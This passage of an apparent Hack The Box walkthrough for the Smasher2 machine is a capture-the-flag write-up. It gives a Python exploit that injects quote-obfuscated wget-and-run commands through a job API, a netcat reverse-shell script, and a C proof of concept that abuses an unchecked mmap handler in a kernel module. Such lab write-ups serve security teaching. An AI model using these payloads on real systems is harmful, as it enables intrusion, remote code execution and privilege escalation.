class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">(session)</span>:</span></span><br><span class="line">req = session.post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/auth"</span>, json=&#123;<span class="string">"action"</span>:<span class="string">"auth"</span>,<span class="string">"data"</span>:&#123;<span class="string">"username"</span>:<span class="string">"Administrator"</span>,<span class="string">"password"</span>:<span class="string">"Administrator"</span>&#125;&#125;)</span><br><span class="line">response = req.json()</span><br><span class="line">key = response[<span class="string">'result'</span>][<span class="string">'key'</span>]</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(session, key)</span>:</span></span><br><span class="line">download_payload = <span class="string">"\'w\'g\'e\'t \'h\'t\'t\'p\':\'/\'/\'1\'0\'.\'1\'0\'.\'x\'x\'.\'x\'x\'/\'s\'h\'e\'l\'l\'.\'s\'h\'"</span></span><br><span class="line">print(YELLOW + <span class="string">"[+] Downloading payload"</span>)</span><br><span class="line">download_req = session.post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/api/&#123;&#125;/job"</span>.format(key), json=&#123;<span class="string">"schedule"</span>:download_payload&#125;)</span><br><span class="line">print(GREEN + <span class="string">"[*] Done"</span>)</span><br><span class="line">exec_payload = <span class="string">"s\'h\' \'s\'h\'e\'l\'l\'.\'s\'h"</span></span><br><span class="line">print(YELLOW + <span class="string">"[+] Executing payload"</span>)</span><br><span class="line">exec_req = session.post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/api/&#123;&#125;/job"</span>.format(key), json=&#123;<span class="string">"schedule"</span>:exec_payload&#125;)</span><br><span class="line">print(GREEN + <span class="string">"[*] Done. Exiting ..."</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.get(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/login"</span>)</span><br><span class="line">print(YELLOW +<span class="string">"[+] Authenticating"</span>)</span><br><span class="line">key = getKey(session)</span><br><span class="line">print(GREEN + <span class="string">"[*] Session: "</span> + session.cookies.get_dict()[<span class="string">'session'</span>])</span><br><span class="line">print(GREEN + <span class="string">"[*] key: "</span> + key)</span><br><span class="line">exploit(session, key)</span><br></pre></td></tr></table></figure><p>The exploit sends 2 commands, the first one is a <code>wget</code> command that downloads <code>shell.sh</code> and the other one executes it.<br><code>shell.sh</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>I hosted it on a python server and I started a <code>netcat</code> listener on port 1337 then I ran the exploit:<br><img src="/images/hackthebox/smasher2/10.png" alt=""><br>We owned user.</p><h2 id="dhid-ko-Enumeration"><a href="#dhid-ko-Enumeration" class="headerlink" title="dhid.ko: Enumeration"></a>dhid.ko: Enumeration</h2><p>After getting a shell I copied my public <code>ssh</code> key to <code>/home/dzonerzy/.ssh/authorized_keys</code> and got ssh access.<br>In the home directory of <code>dzonerzy</code> there was a <code>README</code> containing a message from him saying that we’ll need to think outside the box to root smasher2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ ls -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Feb 15  2019 ..</span><br><span class="line">lrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc</span><br><span class="line">drwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache</span><br><span class="line">drwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg</span><br><span class="line">drwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local</span><br><span class="line">-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile</span><br><span class="line">-rw-r--r-- 1 root     root      900 Feb 16  2019 README</span><br><span class="line">drwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 13 12:50 smanager</span><br><span class="line">-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt</span><br><span class="line">dzonerzy@smasher2:~$ cat README </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         .|&#39;&#39;&#39;.|                            &#39;||                      </span><br><span class="line">         ||..  &#39;  .. .. ..    ....    ....   || ..     ....  ... ..  </span><br><span class="line">          &#39;&#39;|||.   || || ||  &#39;&#39; .||  ||. &#39;   ||&#39; ||  .|...||  ||&#39; &#39;&#39; </span><br><span class="line">        .     &#39;||  || || ||  .|&#39; ||  . &#39;|..  ||  ||  ||       ||     </span><br><span class="line">        |&#39;....|&#39;  .|| || ||. &#39;|..&#39;|&#39; |&#39;..|&#39; .||. ||.  &#39;|...&#39; .||.    v2.0 </span><br><span class="line">                                                             </span><br><span class="line">                                                        by DZONERZY </span><br><span class="line"></span><br><span class="line">Ye you&#39;ve come this far and I hope you&#39;ve learned something new, smasher wasn&#39;t created</span><br><span class="line">with the intent to be a simple puzzle game... but instead I just wanted to pass my limited</span><br><span class="line">knowledge to you fellow hacker, I know it&#39;s not much but this time you&#39;ll need more than</span><br><span class="line">skill, you will need to think outside the box to complete smasher 2 , have fun and happy</span><br><span class="line"></span><br><span class="line">                                       Hacking!</span><br><span class="line"></span><br><span class="line">free(knowledge);</span><br><span class="line">free(knowledge);</span><br><span class="line">* error for object 0xd00000000b400: pointer being freed was not allocated *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure><p>After some enumeration, I checked the <code>auth</code> log and saw this line:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat &#x2F;var&#x2F;log&#x2F;auth.log</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">Dec 13 11:49:34 smasher2 sudo:     root : TTY&#x3D;unknown ; PWD&#x3D;&#x2F; ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;insmod &#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;dhid.ko</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure><p><code>insmod</code> (stands for <code>insert module</code>) is a tool used to load kernel modules. <code>dhid.ko</code> is a kernel module (<code>ko</code> stands for kernel object)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cd &#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ file dhid.ko </span><br><span class="line">dhid.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]&#x3D;d4315261f7c9c38393394f6779378abcff6270d2, not stripped</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure><p>I checked the loaded kernel modules and that module was still loaded:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ lsmod | grep dhid</span><br><span class="line">dhid                   16384  0</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure><p>We can use <code>modinfo</code> to list the information about that module, as you can see it was written by <code>dzonerzy</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ modinfo dhid</span><br><span class="line">filename:       &#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;dhid.ko</span><br><span class="line">version:        1.0</span><br><span class="line">description:    LKM for dzonerzy dhid devices</span><br><span class="line">author:         DZONERZY</span><br><span class="line">license:        GPL</span><br><span class="line">srcversion:     974D0512693168483CADFE9</span><br><span class="line">depends:        </span><br><span class="line">retpoline:      Y</span><br><span class="line">name:           dhid</span><br><span class="line">vermagic:       4.15.0-45-generic SMP mod_unload </span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure><p>Last thing I wanted to check was if there was device driver file for the module:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$ ls -la &#x2F;dev&#x2F; | grep dhid</span><br><span class="line">crwxrwxrwx  1 root root    243,   0 Dec 13 11:49 dhid</span><br><span class="line">dzonerzy@smasher2:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid$</span><br></pre></td></tr></table></figure><p>I downloaded the module on my box to start analyzing it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# scp -i id_rsa dzonerzy@smasher2.htb:&#x2F;lib&#x2F;modules&#x2F;4.15.0-45-generic&#x2F;kernel&#x2F;drivers&#x2F;hid&#x2F;dhid.ko .&#x2F; </span><br><span class="line">dhid.ko                                                                                                                                                                                                  100% 8872    16.1KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# file dhid.ko </span><br><span class="line">dhid.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]&#x3D;d4315261f7c9c38393394f6779378abcff6270d2, not stripped</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure><h2 id="dhid-ko-Analysis"><a href="#dhid-ko-Analysis" class="headerlink" title="dhid.ko: Analysis"></a>dhid.ko: Analysis</h2><p>I opened the module in <code>ghidra</code> then I started checking the functions:<br><img src="/images/hackthebox/smasher2/11.png" alt=""><br>The function <code>dev_read()</code> had a hint that this is the intended way to root the box:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">dev_read</span><span class="params">(undefined8 param_1,undefined8 param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  iVar1 = _copy_to_user(param_2,<span class="string">"This is the right way, please exploit this shit!"</span>,<span class="number">0x30</span>);</span><br><span class="line">  <span class="keyword">return</span> (ulong)(-(uint)(iVar1 == <span class="number">0</span>) &amp; <span class="number">0xf</span>) - <span class="number">0xe</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>One interesting function that caught my attention was <code>dev_mmap()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ulong <span class="title">dev_mmap</span><span class="params">(undefined8 param_1,<span class="keyword">long</span> *param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  uVar3 = (<span class="keyword">int</span>)param_2[<span class="number">1</span>] - *(<span class="keyword">int</span> *)param_2;</span><br><span class="line">  uVar1 = (uint)(param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span>);</span><br><span class="line">  printk(&amp;DAT_00100380,(ulong)uVar3,param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span> &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((<span class="keyword">int</span>)uVar3 &lt; <span class="number">0x10001</span>) &amp;&amp; (uVar1 &lt; <span class="number">0x1001</span>)) &amp;&amp; ((<span class="keyword">int</span>)(uVar3 + uVar1) &lt; <span class="number">0x10001</span>)) &#123;</span><br><span class="line">    uVar1 = remap_pfn_range(param_2,*param_2,(<span class="keyword">long</span>)(<span class="keyword">int</span>)uVar1,param_2[<span class="number">1</span>] - *param_2,param_2[<span class="number">9</span>]);</span><br><span class="line">    uVar2 = (ulong)uVar1;</span><br><span class="line">    <span class="keyword">if</span> (uVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      printk(&amp;DAT_0010057b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      uVar2 = <span class="number">0xfffffff5</span>;</span><br><span class="line">      printk(&amp;DAT_00100567);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">0xfffffff5</span>;</span><br><span class="line">    printk(&amp;DAT_001003b0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In case you don’t know what <code>mmap</code> is, simply <code>mmap</code> is a system call which is used to map memory to a file or a device. (Check <a href="https://jameshfisher.com/2017/01/26/mmap/" target="_blank" rel="noopener">this</a>)<br>The function <code>dev_mmap()</code> is a custom <code>mmap</code> handler.<br>The interesting part here is the call to <code>remap_pfn_range()</code> function (remap kernel memory to userspace):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remap_pfn_range(param_2,*param_2,(<span class="keyword">long</span>)(<span class="keyword">int</span>)uVar1,param_2[<span class="number">1</span>] - *param_2,param_2[<span class="number">9</span>]);</span><br></pre></td></tr></table></figure><p>I checked the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-remap-pfn-range.html" target="_blank" rel="noopener">documentation</a> of <code>remap_pfn_range()</code> to know more about it, the function takes 5 arguments:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remap_pfn_range</span> <span class="params">(struct vm_area_struct * vma,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span>,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">pgprot_t</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>Description of each argument:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">vma</span></span></span><br><span class="line"><span class="class">    <span class="title">user</span> <span class="title">vma</span> <span class="title">to</span> <span class="title">map</span> <span class="title">to</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">long</span> <span class="title">addr</span></span></span><br><span class="line"><span class="class">    <span class="title">target</span> <span class="title">user</span> <span class="title">address</span> <span class="title">to</span> <span class="title">start</span> <span class="title">at</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span></span></span><br><span class="line"><span class="class">    <span class="title">physical</span> <span class="title">address</span> <span class="title">of</span> <span class="title">kernel</span> <span class="title">memory</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">long</span> <span class="title">size</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span> <span class="title">of</span> <span class="title">map</span> <span class="title">area</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">pgprot_t</span> <span class="title">prot</span></span></span><br><span class="line"><span class="class">    <span class="title">page</span> <span class="title">protection</span> <span class="title">flags</span> <span class="title">for</span> <span class="title">this</span> <span class="title">mapping</span></span></span><br></pre></td></tr></table></figure><p>If we look at the function call again we can see that the 3rd and 4th arguments (physical address of the kernel memory and size of map area) are given to the function without any prior validation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ulong <span class="title">dev_mmap</span><span class="params">(undefined8 param_1,<span class="keyword">long</span> *param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  uVar3 = (<span class="keyword">int</span>)param_2[<span class="number">1</span>] - *(<span class="keyword">int</span> *)param_2;</span><br><span class="line">  uVar1 = (uint)(param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span>);</span><br><span class="line">  printk(&amp;DAT_00100380,(ulong)uVar3,param_2[<span class="number">0x13</span>] &lt;&lt; <span class="number">0xc</span> &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((<span class="keyword">int</span>)uVar3 &lt; <span class="number">0x10001</span>) &amp;&amp; (uVar1 &lt; <span class="number">0x1001</span>)) &amp;&amp; ((<span class="keyword">int</span>)(uVar3 + uVar1) &lt; <span class="number">0x10001</span>)) &#123;</span><br><span class="line">    uVar1 = remap_pfn_range(param_2,*param_2,(<span class="keyword">long</span>)(<span class="keyword">int</span>)uVar1,param_2[<span class="number">1</span>] - *param_2,param_2[<span class="number">9</span>]);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>This means that we can map any size of memory we want and read/write to it, allowing us to even access the kernel memory.</p><h2 id="dhid-ko-Exploitation-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#dhid-ko-Exploitation-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="dhid.ko: Exploitation –&gt; Root Shell –&gt; Root Flag"></a>dhid.ko: Exploitation –&gt; Root Shell –&gt; Root Flag</h2><p>Luckily, <a href="https://labs.f-secure.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf" target="_blank" rel="noopener">this white paper</a> had a similar scenario and explained the exploitation process very well, I recommend reading it after finishing the write-up, I will try to explain the process as good as I can but the paper will be more detailed. In summary, what’s going to happen is that we’ll map a huge amount of memory and search through it for our process’s <code>cred</code> structure (The <code>cred</code> structure holds our process credentials) then overwrite our <code>uid</code> and <code>gid</code> with <code>0</code> and execute <code>/bin/sh</code>. Let’s go through it step by step.<br>First, we need to make sure that it’s really exploitable, we’ll try to map a huge amount of memory and check if it worked:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] PID: %d\n"</span>, getpid());</span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Open failed!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">perror(<span class="string">"[!] Failed to mmap"</span>);</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stop</span> = getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I compiled the code and uploaded it to the box:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# gcc -o pwn pwn.c </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# scp -i id_rsa .&#x2F;pwn dzonerzy@smasher2.htb:&#x2F;dev&#x2F;shm&#x2F;pwn</span><br><span class="line">pwn                                                                                100%   17KB  28.5KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2#</span><br></pre></td></tr></table></figure><p>Then I ran it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 8186</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br></pre></td></tr></table></figure><p>From another <code>ssh</code> session I checked the process memory mapping, the attempt was successful:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ cat &#x2F;proc&#x2F;8186&#x2F;maps </span><br><span class="line">42424000-132424000 rw-s 00000000 00:06 440                               &#x2F;dev&#x2F;dhid</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><p>Now we can start searching for the <code>cred</code> structure that belongs to our process, if we take a look at the how the <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h" target="_blank" rel="noopener"><code>cred</code> structure</a> looks like:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 